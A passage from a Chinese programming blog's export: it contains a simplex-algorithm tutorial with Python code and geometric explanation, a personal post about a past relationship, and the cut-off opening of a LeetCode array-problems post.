首先初始化目标函数，然后不断的使用add_constraint添加约束条件。 注意在上面的Simplex类中，我们在初始化中加入了参数max_mode，处理最大值的情况。 然后在16~18行中，我们初始化了最开始的基本变量为B, 需要松弛的变量有m-1个，合并（m-1） *（ m-1）的一个对角阵和一行有m-1个0的数组（这是目标函数），然后将他们和原来的合并起来，这样就构成了我们的S矩阵。 19行判断是否还有元素可以继续被增大（就是系数为负） 20-22行选择合适的替入和替出变量，若无替出变量，说明原问题无界，我们在23行处理了这种情况。 24~27就是旋转的过程，进行矩阵的行变换。并用B数组记录替入的替入变量。 28行我们返回目标值z，若为最小值，则要*-1，最大值则不用（因为一开始已经*-1了）。然后最后对应x的解就是基本变量为对应的\\(b_i\\)，非基本变量为0，注意删除我们松弛添加的变量（所以只要判断下标是否 &lt; n） simplex 0.99 beta 就是这么少的代码这么容易的就实现了！ 来，跟我一起喊：python 大法好！ 初始解 ≠ 基本可行解以及无解的情况 在你高呼python大法好的时候，！ 但是我把它称为beta 0.99版本肯定是有原因的，绝大多数情况下，初始解就是基本可行解，但是也有例外啊！ 而且还有无解的情况。(╯‵□′)╯︵┻━┻ 栗子 栗子1 栗子1登场： \\[ \\begin{alignat}{2} \\min\\quad &amp;x_1 + 2x_2&amp; \\\\ \\mbox{s.t.}\\quad &amp;x_1 + x_2 &amp;\\leq{2} \\\\ &amp;x_1 + x_2 &amp; \\geq{1}\\\\ &amp;x_1, \\quad x_2 &amp;\\geq{0} &amp;\\\\ \\end{alignat} \\] 首先转化为标准形式（&gt;= 改成 &lt;=, *-1），然后再转化为松弛形式： \\[ \\begin{alignat}{2} \\min\\quad &amp;x_1 + 2x_2&amp; \\\\ \\mbox{s.t.}\\quad &amp; x_3 = 2 - x_1 - x_2 \\\\ &amp;x_4 = -1 + x_1 + x_2\\\\ &amp;x_1, \\quad x_2 , \\quad x_3 , \\quad x_4 \\geq{0} \\\\ \\end{alignat} \\] 而我们假设的非基本变量全为0，于是有：\\((x_1,x_2,x_3,x_4) = (0,0,2,-1)\\)，但是\\(x_4= -1\\)是不满足条件的。即初始解不是基本可行解。 example_for_feasible_solution 栗子2 再比如下面的例子（栗子2）： \\[ \\begin{alignat}{2} \\min\\quad &amp;x_1 + 2x_2&amp; \\\\ \\mbox{s.t.}\\quad &amp;x_1 + x_2 &amp;\\geq{2} \\\\ &amp;x_1 + x_2 &amp; \\leq{1}\\\\ &amp;x_1, \\quad x_2 &amp;\\geq{0} &amp;\\\\ \\end{alignat} \\] 其实这个例子就是例子1改变了个符号而已，但是要&gt;=2，然后又要&lt;=1的情况，这个例子显然是无解的。 example_for_no_feasible_solution 我们来看看初始解的情况，继续转化为标准形式，然后再转化为松弛形式： \\[ \\begin{alignat}{2} \\min\\quad &amp;x_1 + 2x_2&amp; \\\\ \\mbox{s.t.}\\quad &amp; x_3 = -2 + x_1 + x_2 \\\\ &amp;x_4 = 1 - x_1 - x_2\\\\ &amp;x_1, \\quad x_2 , \\quad x_3 , \\quad x_4 \\geq{0} \\\\ \\end{alignat} \\] 同样的，非基本变量全为0，于是有 \\((x_1,x_2,x_3,x_4) = (0,0,-2,1)\\)，但是\\(x_3 = -2\\)是不满足条件的。即初始解不是基本可行解。 simplex beta0.99测试 在上面的两个例子中，用我们的simplex beta0.99跑有啥结果呢？ 第1个栗子,第一个矩阵为初始的矩阵，接下来是结果和对应的x1,x2值，然后是最后的矩阵 [[ 0. 1. 2. 0. 0.] [-1. -1. -1. 1. 0.] [ 2. 1. 1. 0. 1.]] (-0.0, {}) [[ 0. 1. 2. 0. 0.] [-1. -1. -1. 1. 0.] [ 2. 1. 1. 0. 1.]] 可以看到，由于c &gt;=0，直接不迭代了，而这个问题用GLPK计算，正确的结果应该为：\\(z = 1, x_1 = 1\\) 第2个栗子：格式同上，结果如下 [[ 0. 1. 2. 0. 0.] [-2. -1. -1. 1. 0.] [ 1. 1. 1. 0. 1.]] (-0.0, {}) [[ 0. 1. 2. 0. 0.] [-2. -1. -1. 1. 0.] [ 1. 1. 1. 0. 1.]] 这个应该是无解的。 初始化 从上面的例子中，simplex beta 0.99 可以说是错误的! simplex beta 0.99产生错误的原因就是总把初始解当作基本可行解！ 拍拍，打脸(￣ε(#￣) 那么如何做才是正确的呢？ 问题回到我们的单纯形算法的第一步：找到一个初始的基本可行解。如何找？ 我们首先思考上面的问题为什么会不可行。原因就是因为有\\(b_i &lt; 0\\)! 因此，对于一个线性规划问题，有如下的情况： 若所有的\\(b_i &gt;=0\\)，说明初始的基本解就是基本可行解，在这种情况下，simplex beta 0.99是正确的。 若有\\(b_i &lt; 0\\), 我们需要进行初始化操作，判断其是否有解（如栗子2），并返回一个基本可行解，然后运行simplex beta 0.99 第一种情况就是之前讨论的，这里讨论第二种情况。 以第一个栗子为例，构造辅助线性规划（auxiliary linear program）如下： \\[ \\begin{alignat}{2} \\min\\quad &amp;x_0&amp; \\\\ \\mbox{s.t.}\\quad &amp;x_1 + x_2 - x_0&amp;\\leq&amp;{2} \\\\ &amp;-x_1 - x_2 - x_0 &amp; \\leq&amp;{-1}\\\\ &amp;x_1, \\quad x_2,\\quad x_0 &amp;\\geq{0} &amp;\\\\ \\end{alignat} \\] 然后求解这个辅助线性规划\\(L_{aux}\\)，如果\\(L_{aux}\\)的最优解\\(x_0\\)为0的话，说明这个原线性方程组有解。 下面是算法导论的证明，它证明的是最大化 \\(x_0\\) 和我们最小化x\\(x_0\\) 是一样的。 proof for auxiliary_lp 把\\(L_{aux}\\) 写成松弛形式： \\[ \\begin{alignat}{2} &amp; z = x_0 \\\\ &amp;x_3 = 2 - x_1 - x_2 + x_0 \\\\ &amp;x_4 = -1 + x_1 + x_2 + x_0\\\\ &amp;x_1, \\quad x_2,\\quad x_3,\\quad x_4,\\quad x_0 &amp;\\geq{0} &amp;\\\\ \\end{alignat} \\] 注意到这个初始解\\((x_1,x_2,x_3,x_4,x_0) = (0,0,2,-1,0)\\) 也不是基本可行解。现在马上就可以看到引入\\(x_0\\)的原因了，我们把\\(x_0\\)做为替入变量，选一个b最小的那一行的基本变量作为替出变量（这里是\\(x_4\\)），进行一次旋转操作，得： \\[ \\begin{alignat}{2} &amp;z = 1 - x_1 - x_2 + x_4\\\\ &amp;x_3 = 2 - x_1 - x_2 + x_0 \\\\ &amp;x_0 = 1 - x_1 - x_2 + x_4\\\\ \\end{alignat} \\] 进行旋转之后，初始解\\((x_1,x_2,x_3,x_4,x_0)\\) 变为 (0,0,2,0,1)，这就是因为\\(x_0\\) 的替入 ，使得所有的b &gt;=0 有人可能会问，上面的例子中，只有一个负的，多个负的怎么办？还能保证么？ 答案是可以的，因为我们选择替出的是\\(b_i\\) 为负的最小的那一行的基本变量，而一开始，我们构建辅助函数时，\\(x_0\\)的系数为-1，因此，旋转的时候，矩阵运算相当于其它每一行减去这一行，而b为负，负负得正，必然最后所有的b都&gt;=0。 现在，我们已经有一个基本可行解了，我们求解这个辅助线性规划即可。 和上面的思想一样，这里要么增大\\(x_1\\), 要么增大\\(x_2\\)，假设选择\\(x_1\\)，然后第二个等式有最严格的限制，选择\\(x_0\\)为替出变量，得 \\(x_1 = 1 - x_2 + x_4 - x_0\\) \\[ \\begin{alignat}{2} &amp;z = x_0\\\\ &amp;x_3 = 1 - x_4 + 2x_0 \\\\ &amp;x_1 = 1 - x_2 + x_4 - x_0\\\\ \\end{alignat} \\] 此时，基本解为：\\((x_1,x_2,x_3,x_4,x_0)= (1,0,1,0,0)\\), 此时\\(z = x_0 = 0\\),无法继续增大某个变量使得z继续减少，因此此时为最优解，就是z =0，说明原问题有解。 接下来，我们要恢复原问题的目标函数，就是用现在的基本变量替代原目标函数中的基本变量（若\\(x_0\\)是基本变量，那就要旋转去掉它），此外由于\\(x_0 = 0\\),因此可以将其去掉： \\[ \\begin{alignat}{2} &amp;z &amp;=&amp; \\quad x_1 + 2x_2 \\\\ &amp; &amp;=&amp; \\quad 1 + x_2 + x_4 - x_0\\\\ &amp; &amp;=&amp; \\quad 1 + x_2 + x_4\\\\ \\end{alignat} \\] 其它的约束条件同理去掉\\(x_0\\)可得： \\[ \\begin{alignat}{2} &amp;z = 1 + x_2 + x_4\\\\ &amp;x_3 = 1 - x_4 \\\\ &amp;x_1 = 1 - x_2 + x_4\\\\ \\end{alignat} \\] 因此，现在，我们通过构造了一个辅助线性规划Laux 将原来的问题转化为上面的线性规划，并且它的初始解就是基本可行解：\\((x_1,x_2,x_3,x_4 = (1,0,1,0)\\)，然后求解这个新的线性规划即可。 我们很幸运的发现（其实是博主偷懒举了个简单的例子(✿◡‿◡)），这里无法通过增大任何的变量使得目标值变小，因此此时就是结果啦，而\\((x_1,x_2,x_3,x_4 = (1,0,1,0)\\)就是最后的解，z = 1。 下面总结一下上面的过程， 若bi都大于等于0 跳到9 引入\\(x_0\\)，创建一个辅助线性规划\\(L_{aux}\\) 将\\(L_{aux}\\)写成松弛形式 选择\\(b_i\\)最小的那一行的基本变量为替出变量，\\(x_0\\)为替入变量，进行一次旋转操作 求解\\(L_{aux}\\) 若\\(L_{aux}\\)的最优解为0，那么原问题有解，否则无解，return \"no answer\" 在有解的情况下，若\\(x_0\\)为基本解，那么执行一次旋转，把它变为非基本变量 恢复原始的目标函数，但是将其基本变量替换掉 运行simplex beta 0.99 对新的线性规划方程求解。 PS：有兴趣的读者可以计算一下例子2，会发现辅助函数的最优解不是0,而是0.5，说明无解 完整的单纯形算法 结合simplex beta 0.99和初始化的过程，可以写成如下的simplex 1.0代码（去除版权信息，空行等，也只要40行左右，还是简洁^ ^） 123456789101112131415161718192021222324252627282930313233343536373839404142434445# -*- coding: utf-8 -*-# @Date : 2016/11/17# @Author : hrwhisperimport numpy as npclass Simplex(object): def __init__(self, obj, max_mode=False): # default is solve min LP, if want to solve max lp,should * -1 self.mat, self.max_mode = np.array([[0] + obj]) * (-1 if max_mode else 1), max_mode def add_constraint(self, a, b): self.mat = np.vstack([self.mat, [b] + a]) def _simplex(self, mat, B, m, n): while mat[0, 1:].min() &lt; 0: col = np.where(mat[0, 1:] &lt; 0)[0][0] + 1 # use Bland&#x27;s method to avoid degeneracy. use mat[0].argmin() ok? row = np.array([mat[i][0] / mat[i][col] if mat[i][col] &gt; 0 else 0x7fffffff for i in range(1, mat.shape[0])]).argmin() + 1 # find the theta index if mat[row][col] &lt;= 0: return None # the theta is ∞, the problem is unbounded self._pivot(mat, B, row, col) return mat[0][0] * (1 if self.max_mode else -1), &#123;B[i]: mat[i, 0] for i in range(1, m) if B[i] &lt; n&#125; def _pivot(self, mat, B, row, col): mat[row] /= mat[row][col] ids = np.arange(mat.shape[0]) != row mat[ids] -= mat[row] * mat[ids, col:col + 1] # for each i!= row do: mat[i]= mat[i] - mat[row] * mat[i][col] B[row] = col def solve(self): m, n = self.mat.shape # m - 1 is the number slack variables we should add temp, B = np.vstack([np.zeros((1, m - 1)), np.eye(m - 1)]), list(range(n - 1, n + m - 1)) # add diagonal array mat = self.mat = np.hstack([self.mat, temp]) # combine them! if mat[1:, 0].min() &lt; 0: # is the initial basic solution feasible? row = mat[1:, 0].argmin() + 1 # find the index of min b temp, mat[0] = np.copy(mat[0]), 0 # set first row value to zero, and store the previous value mat = np.hstack([mat, np.array([1] + [-1] * (m - 1)).reshape((-1, 1))]) self._pivot(mat, B, row, mat.shape[1] - 1) if self._simplex(mat, B, m, n)[0] != 0: return None # the problem has no answer if mat.shape[1] - 1 in B: # if the x0 in B, we should pivot it. self._pivot(mat, B, B.index(mat.shape[1] - 1), np.where(mat[0, 1:] != 0)[0][0] + 1) self.mat = np.vstack([temp, mat[1:, :-1]]) # recover the first line for i, x in enumerate(B[1:]): self.mat[0] -= self.mat[0, x] * self.mat[i + 1] return self._simplex(self.mat, B, m, n) 上面的代码中，将旋转操作独立为一个方法（23~27），将单纯形算法的核心也独立为一个方法（14~21），这是考虑到要多次调用的原因，并且代码之前的几乎没什么变化，这里不做过多的解释。 主要变化在于solve方法，30~32和之前是一样的，不解释 ♪(^ ∇^*) 33行判断是否有一个b &lt; 0 ？如果有，说明初始解不可行。否则直接执行45行，调用单纯形算法 34~44处理的是不可行的情况， 34：首先找一个最小b的下标 35和36作用在于保存原来的目标函数，并将第0行设为0，然后添加\\(x_0\\) 需要拼接矩阵，其实就是构造辅助线性规划\\(L_{aux}\\) 37执行旋转操作，使其初始解可行 38行求解\\(L_{aux}\\) 最优值是否为0，是就是有解，否则无解 40-41行若最后的\\(x_0\\)是基本解，找一个第0行不是0的元素作为替入变量，将x0替出 42~44 恢复初始目标函数，删除\\(x_0\\)那一列，并且替换目标函数中的基本变量。 好了，代码还是很短，其实能更短，但是会影响可读性！ 再来高呼： Python 大法好！ 从几何角度看单纯形算法 上面我们介绍单纯形算法的时候，是通过最直观的等式变换（就是旋转操作）介绍的。 我们知道，线性规划就是在可行域围成的多胞形中求解，现在从几何的视图来看看单纯形算法。 只需考虑顶点 让我再次召唤之前的图： example_for_feasible_region 直观上看，最优解就在顶点上，不需要考虑内部点。 一个引入的证明 only_consider_vertex_proof_1 我们假设\\(x^{(0)}\\)是最优解，连接\\(x^{(1)}\\)和\\(x^{(0)}\\)与 \\(x^{(2)}\\)和\\(x^{(3)}\\)相交于点x' 我们可以把\\(x^{(0)}\\)分解，\\(x^{(0)} = λ_1 x^{(1)} + (1 - λ_1)x&#39;\\) 其中\\(λ_1 = p / (p + q)\\) 同样的把x‘ 分解，\\(x&#39;= λ_2 x^{(2)} + (1 - λ_2)x^{(3)}\\)其中\\(λ_2 = r / (r + s)\\) 因此有：\\(x^{(0)} = λ_1 x^{(1)} + (1 - λ_1)λ_2 x^{(2)} + (1 - λ_1) (1 - λ_2)x^{(3)}\\)，而\\(λ_1 + (1 - λ_1)λ_2 + (1 - λ_1) (1 - λ_2) = 1\\) 设 \\(c^Tx^{(1)}\\) 小于等于 \\(c^T x^{(2)}\\)， \\(c^Tx^{(3)}\\)，因此有： \\[ \\begin{alignat}{2} C^Tx^{(0)} &amp;=λ_1 C^T x^{(1)} + (1 - λ_1)λ_2 C^T x^{(2)} + (1 - λ_1) (1 - λ_2) C^T x^{(3)} \\\\ &amp; \\geq λ_1 C^T x^{(1)} + (1 - λ_1)λ_2 C^T x^{(1)} + (1 - λ_1) (1 - λ_2) C^T x^{(1)}\\\\ &amp; =C^Tx^{(1)} \\end{alignat} \\] 因此，\\(x^{(1)}\\) 并不比\\(x^{(0)}\\)差。 我们可以推广到更多的情况。(见附件的68页) 多边形的顶点等价于矩阵的基 上面提到，最优解一定在顶点上，我们不需要考虑内部的点。 那么，如何获得顶点呢？ 可以证明，顶点就是基，基就是顶点。（见附件的72-78页） 我们只需要找到矩阵的基就好了。 顶点的游走 我们知道，多边形的顶点就是基，且最优解在顶点上，我们需要做的就是，按照一定的规则沿着边遍历顶点，直到不能更新了为止。 如何从一个顶点到另一个顶点？更新到什么时候为止？ 我们先讨论第一个问题。 还是一开始介绍单纯形算法的例子： \\[ \\begin{alignat}{2} \\min\\quad &amp;-x_1 -14x_2 - 6x_3&amp; \\\\ \\mbox{s.t.}\\quad &amp;x_1 + x_2 +x_3 + x_4 \\quad \\quad \\quad \\quad \\quad \\quad \\quad &amp;=&amp; \\quad4&amp;\\\\ &amp;x_1 \\quad \\quad \\quad \\quad \\quad \\quad \\quad+x_5 \\quad \\quad\\quad \\quad\\quad&amp;=&amp;\\quad2&amp;\\\\ &amp; \\quad\\quad \\quad \\quad\\quad x_3 + \\quad \\quad \\quad \\quad + x_6&amp;=&amp;\\quad3&amp;\\\\ &amp; \\quad \\quad 3x_2 + x_3\\quad\\quad \\quad \\quad\\quad \\quad \\quad +x_7&amp;=&amp;\\quad6&amp;\\\\ &amp;x_1, \\quad x_2 ,\\quad x_3, \\quad x_4, \\quad x_5 ,\\quad x_6, \\quad x_7\\quad &amp;\\quad\\geq{0} &amp;\\\\ \\end{alignat} \\] 其松弛条件系数A，目标函数系数C，用矩阵表示为： \\[ \\begin{equation} %开始数学环境 C = \\left( %左括号 \\begin{array}{c} -1 &amp; -14 &amp; -6&amp; 0 &amp;0 &amp;0 &amp;0\\\\ %第一行元素 \\end{array} \\right) %右括号 \\\\ \\quad \\\\ B =\\left( \\begin{array}{c} 4\\\\ 2\\\\ 3\\\\ 6\\\\ \\end{array} \\right) \\quad A =\\left( %左括号 \\begin{array}{c} %c为居中放置 1 &amp; 1 &amp; 1&amp; 1 &amp;0 &amp;0 &amp;0\\\\ %第一行元素 1 &amp; 0 &amp; 0&amp; 0 &amp;1 &amp;0 &amp;0\\\\ %第二行元素 0 &amp; 0 &amp; 1&amp; 0 &amp;0 &amp;1 &amp;0\\\\ %第三行元素 0 &amp; 3 &amp; 1&amp; 0 &amp;0 &amp;0 &amp;1\\\\ %第四行元素 \\end{array} \\right) %右括号 \\end{equation} \\] 这里假设我们初始的解X设为\\((x_1,x_2,x_3 ,x_4 ,x_6,x_7) = (0,0,0,4,2,3,6)\\).就是我们的初始在(0,0,0)的点上。 我们的初始点用红点来表示，而绿色的线就是我们下一步走的边，如下图所示： walk_though_vertex 要实现图中绿色的边，如何做呢？ 其实就是之前旋转的操作！想想我们之前的旋转，我们要选择\\(x_1\\)为替入变量，\\(x_5\\)为替出变量，然后执行旋转。 （忘记的翻回去看，这里不赘述）然后就得到新的基本解及其值为：\\((x_1,x_2....x_7) = (2,0,0,2,0,3,6)\\)。注意，这时候我们已经到达新的点了！可以说就是沿着那条边走的！ 可以说，设边的方向为λ，我们沿着边走的距离是θ，那么，我们走的就是\\(x &#39; = x - θλ\\)。 那么λ是什么呢？其实就是选择一个非基的列向量。 为了说明，我们用\\(a_1 .. a_7\\) 来表示矩阵A的对应的列： \\[ \\begin{equation} A =\\left( \\begin{array}{c} 1 &amp; 1 &amp; 1&amp; 1 &amp;0 &amp;0 &amp;0\\\\ 1 &amp; 0 &amp; 0&amp; 0 &amp;1 &amp;0 &amp;0\\\\ 0 &amp; 0 &amp; 1&amp; 0 &amp;0 &amp;1 &amp;0\\\\ 0 &amp; 3 &amp; 1&amp; 0 &amp;0 &amp;0 &amp;1\\\\ \\end{array} \\right) \\end{equation} \\] 可以看到非基向量可以用基向量表示，比如这里\\(a_1 = 1a_4 + 1a_5 + 0a_6 + 0a_7\\)也就是 \\(-a_1+ 0a_2 + 0a_3 + 1a_4 + 1a_5 + 0a_6 + 0a_7 = 0\\) 我们的λ 也就等于这个系数，就是\\(λ = (-1,0,0,1,1,0,0)\\) 那么走多少呢？走过多会超出区域，过少会达不到顶点，答案就是2！想想我们之前选\\(x_5\\)的原因：\\(x_5\\)最大程度的限制了\\(x_1\\)的值， \\(x_1 &lt;= 2\\)，于是我们定义θ就是限制最紧的值。换句话说，在S矩阵中，就是\\(bi / x[i][1]\\)最小的值（θ &gt; 0）。 让我们验算一下： (0,0,0,4,2,3,6) - 2 * (-1,0,0,1,1,0,0) = (2,0,0,2,0,3,6) ! (o゜▽゜)o☆[BINGO!] 和之前的完全一样！ 我们做一次旋转的操作，其实就是一个顶点到另一个顶点的过程！很神奇吧！ 仔细思考一下为什么之前的旋转等价于这里的非基向量表示的边？ 我们用原来的基向量\\((a_4,a_5,a_6,a_7)\\) 来表示\\(a_1\\),其实可以换个角度想想之前的等式变换，我们在这里表示\\(a_1\\)可以认为是之前的将每行有\\(x_1\\)带入的过程。\\(a_1\\)上为1，说明这一行有\\(x_1\\)，我们需要带入。 停止条件 现在，我们已经在顶点上，然后沿着边游走了，那么，我们游走到什么时候为止呢？ 注意，我们的目标是最小化目标函数，即求\\(\\min C^Tx\\) 假设我们从x沿着边到达x'，我们有： \\(x&#39; = x - \\theta \\lambda\\)，我们的λ形式为：\\([λ_1,λ_2,.....,-1,.....λ_m]\\)那么目标函数的值增加了：\\(C^Tx&#39; - C^Tx = - θC^Tλ = -θ(-c_e + Σλ_ic_i) = θ(c_e - Σλ_ic_i)\\) 其中，最后的求和符号是对e替入前的基向量求和的。由于θ &gt;0 ,因此\\(c_e - Σλ_ic_i &gt;=0\\) 说明我们可以停止了（x比x'不差）。我们把\\(c_e - Σλ_ic_i\\) 称为检验数（checking number) 我们把检验数写成矩阵的形式就是：\\(C^T - C^{T_B} B^{-1}A\\) (\\(C^{T_B}\\)为基向量的C的转置)。 下面证明对于顶点x，若检验数 \\(C^T - C^{T_B} B^{-1}A &gt;=0\\) ，则x为最优解。 设y 为其它任意的可行解， 于是有Ay = b, y&gt;=0 \\(C^T y \\ge C^{T_B} B^{-1}Ay = C^{T_B} B^{-1}b = C^{T_B} X_B = C^Tx.\\) 就是说，其它的可行解y不比x好 注意我们旋转的过程中，\\(C^{T_B}=0\\)，或者说\\(Σλ_ic_i = 0\\) 因此，若\\(C_N\\)（非基的那些） 都 &gt;=0 ，就可以停止了。这和之前的其实还是一样的。 小结 用几何的角度看待单纯形算法，主要有几点： 最优解可以在顶点上找到，不需考虑内部点 顶点 &lt;=&gt; 矩阵的基 一次旋转就是一个顶点沿着一条边λ走θ倍到另一个顶点的过程 当我们的检验数 &gt;=0 停止迭代 当然也需要注意初始化单纯形算法，比如之前的情况： example_for_feasible_solution 我们的顶点要在可行域才行，而不要跑到(0,0)去了。初始方法和之前的一样。 时间复杂度 现在，来讨论一下单纯形算法的时间复杂度吧。 在之前的算法中，我们每一次查找一个 负数cx需要O(N)，(这里用N为了区分代码中的N，这里N = m + n)并且查找最小的θ所在的row需要O(m)，然后执行旋转，在旋转中，我们对于i!=row的执行mat[i]= mat[i] - mat[row] * mat[i][col],需要O(m*N) 因此一次的复杂度为O(m*N) 1234567891011121314def _simplex(self, mat, B, m, n): while mat[0, 1:].min() &lt; 0: col = np.where(mat[0, 1:] &lt; 0)[0][0] + 1 # use Bland&#x27;s method to avoid degeneracy. use mat[0].argmin() ok? row = np.array([mat[i][0] / mat[i][col] if mat[i][col] &gt; 0 else 0x7fffffff for i in range(1, mat.shape[0])]).argmin() + 1 # find the theta index if mat[row][col] &lt;= 0: return None # the theta is ∞, the problem is unbounded self._pivot(mat, B, row, col) return mat[0][0] * (1 if self.max_mode else -1), &#123;B[i]: mat[i, 0] for i in range(1, m) if B[i] &lt; n&#125;def _pivot(self, mat, B, row, col): mat[row] /= mat[row][col] ids = np.arange(mat.shape[0]) != row mat[ids] -= mat[row] * mat[ids, col:col + 1] # for each i!= row do: mat[i]= mat[i] - mat[row] * mat[i][col] B[row] = col 那么执行多少次呢？假设为k次就是O(kmN) 在绝大多数的情况下，单纯形算法也都是多项式时间的算法，自从1949年单纯形算法提出后，人们也一度的以为它就是多项式时间的，直到有人出来挑事情。。。。(╯‵□′)╯︵┻━┻ V. Klee and G. L. Minty[1972] 构造了一个例子： \\[ \\begin{alignat}{2} \\max\\quad &amp;x_n&amp; \\\\ \\mbox{s.t.}\\quad &amp; δ &amp;\\leq&amp;\\quad{x_i}\\quad &amp;\\leq&amp;{1}&amp;for\\quad i=1...n \\\\ &amp; δx_{i-1}&amp;\\leq&amp;\\quad{x_i}\\quad&amp;\\leq&amp;1 -δx_{i-1} \\quad&amp;for\\quad i=2...n \\\\ &amp; &amp;&amp;\\quad x_i &amp;\\geq&amp;{0} &amp;for\\quad i=1...n\\\\ \\end{alignat} \\] 在这个例子中，单纯形算法将会遍历2n个顶点。这个例子提出，说明单纯形算法不是一个多项式时间复杂度的算法。但是为什么它实际运行时是多项式时间复杂度的？这个问题困扰了人们很久，直到2001年 Daniel A. Spielman 和 Shang-Hua Teng 提出了平滑型复杂度理论（smoothed complexity），完美的解决了这个问题。 Average-case analysis was first introduced to overcome the limitations of worst-case analysis, however the difficulty is saying what an average case is. The actual inputs and distribution of inputs may be different in practice from the assumptions made during the analysis. Smoothed analysis is a hybrid of worst-case and average-case analyses that inherits advantages of both, by measuring the expected performance of algorithms under slight random perturbations of worst-case inputs. The performance of an algorithm is measured in terms of both the input size, and the magnitude of the perturbations. If the smoothed complexity of an algorithm is low, then it is unlikely that the algorithm will take long time to solve practical instances whose data are subject to slight noises and imprecisions. 可能原值会是非多项式时间的，但是在真实世界中，基本都是真实数据+噪声的值，或者还要加上误差，因此单纯形算法“因祸得福”，一般为多项式时间的。不同于大家做信号处理或者图像处理时，将讨厌的噪声去掉，滕老师说：“噪声是个好东西”。 小结 给定一个线性规划L，就只有如下三种情形： 有一个有限目标值的最优解 不可行 无界 在本文中，我们对其三种情况都进行了讨论，如果有啥疑问或错误欢迎提出。 ^ ^ 单纯形算法本身并不难，老师上课讲的是几何的角度，听得我一愣一愣的，之后看算法导论（就是最开始的等式变换），通熟易懂，但矩阵还是跟着老师的思路写的，然后对照两者的思路发现略有不同，让我纠结不已，觉得有必要整理一下~现在看来，其实这些方法都殊途同归。 然后，写这个blog累死了，用typora打latex,然后blog wordpress再转成图片（现在用mathjax直接支持latex公式拉），看了一下字数9000左右了 好累/(ㄒoㄒ)/~~ 所以觉得好的话可以进行打赏 （逃 参考资料 《算法导论》第三版 第29章 线性规划 国科大计算机算法分析与设计 - Dongbo Bu 线性规划课件 下载地址：Lec8.pdf","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"算法笔记","slug":"study/算法笔记","permalink":"https://www.hrwhisper.me/categories/study/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"往事如烟","slug":"say-goodbye-to-the-past","date":"2016-10-18T09:19:03.000Z","updated":"2020-10-27T14:50:48.540Z","comments":true,"path":"say-goodbye-to-the-past/","link":"","permalink":"https://www.hrwhisper.me/say-goodbye-to-the-past/","excerpt":"","text":"做算法作业，剩下第二题，发现木有背单词，抬头一看时间，已然是23：59。连续109的单词记录已经终结，心里十分难过。 面对电脑惆怅不已，闲来看看博客的访问记录，看到了ex的记录。 分手那么久后，你还多久来一次呢？ 我的博客已经很久很久没有写自己的心情，仅仅是一些leetcode水题的堆积。 你还来看什么呢？ 上次和一个女孩聊天，大概八卦是人的天性，和她互相说了EX的事情。 那些往事，现在已经成为了遥远的故事。 然后我把EX拉黑了。 大概还是有些无法原谅把。 就像我先拉黑你票圈，你接着拉黑我票圈，然后我微信拉黑你。 然后今天才发现你QQ 微博拉黑了我。 我曾设想过不在是朋友的时候的情景，也许我会难过， 但此时却一片平静，大概人与人直接恩断义绝，也不过如此把， 关系早已破裂，只不过在QQ或者微信的通讯录里占着一个不起眼的位置，清除了而已。 也许是你也深爱过吧，就像我曾深爱过一样，也许你只是缅怀把，也许是你我不合衬把。 也许4.25号来轻轻敲门的是你， 也许你在门口敲门的时候，能体会我当年在你门口时候的心情，忐忑的犹豫的轻轻的； 也许你5.10从家里带来了自己做的蛋糕， 也许你等我从实验室回宿舍，然而我写论文写到了十点半； 但那又怎么样呢，你不敢推开那扇门，不敢打我一个电话， 你总是不断说着再见， 总是看着我的博客一声不吭，知道我所有的情绪——当年我可是在博客记下了每天的日志啊。 你不敢，对，你不敢， 我早已不相信你有相伴一生的决心和勇气。 这和当年你当年批评我不果断，在光棍节不表白的时候不一 一样， 那时候，就像那句话一样： “love is a touch and yet not a touch” 爱是想触碰又收回的手， 那时候我想要一步一步的靠近， 慢慢的用余生述说情话， 但你大概是不会明白了， 故事早就已经结尾了， 又怎么能重写呢？ 我早已不在追寻那个你曾经离开的理由， 不在爱， 也不在恨， 我仍然相信爱情， 我的爱情观仍然是要么不开始，要么一辈子，认认真真的， 还是会慢慢的发展感情，除非确定对方也喜欢自己，不然还是不会急于表白把。 前任也许是一个大写的尴尬， 但注定是没法扼杀的存在， 谢谢你曾让我辗转反侧，心痛心碎，让我内心强大了一点 谢谢你让我爱上了跑步这个最好的运动，我已经跑了快800KM啦， 也许不限于此， 我再此一一谢过。 但倘若以后遇见，装作不认识把， 虽然估计是不会遇见， 往事如烟，就让它随风去。 PS:下面为11.12更新的内容 偶然看到， 想起这被设为尽自己可见的日志， 大概内容相似， 于是我把这个日志设为公开了， 也许释怀是仅有的默契， 微笑摇头，点击浏览器的右上角。 -The End-","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"leetcode 数组","slug":"leetcode-arrays","date":"2016-10-10T06:11:49.000Z","updated":"2021-01-26T15:37:49.936Z","comments":true,"path":"leetcode-arrays/","link":"","permalink":"https://www.hrwhisper.me/leetcode-arrays/","excerpt":"本次题解包括 26. Remove Duplicates from Sorted Array 27. Remove Element 88. Merge Sorted Array 189. Rotate Array 209. Minimum Size Subarray Sum 228. Summary Ranges 238. Product of Array Except Self 674. Longest Continuous Increasing Subsequence 713. Subarray Product Less Than K 717. 1-bit and 2-bit Characters 798. Smallest Rotation with Highest Score 等价多米诺骨牌对的数量","text":"本次题解包括 26. Remove Duplicates from Sorted Array 27. Remove Element 88. Merge Sorted Array 189. Rotate Array 209. Minimum Size Subarray Sum 228. Summary Ranges 238. Product of Array Except Self 674. Longest Continuous Increasing Subsequence 713. Subarray Product Less Than K 717. 1-bit and 2-bit Characters 798. Smallest Rotation with Highest Score 等价多米诺骨牌对的数量 26. Remove Duplicates from Sorted Array Given a sorted array, remove the duplicates in-place such that each element appear only once and return the new length. Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory. Example: Given nums = [1,1,2], Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively. It doesn't matter what you leave beyond the new length. 题目地址：leetcode Remove Duplicates from 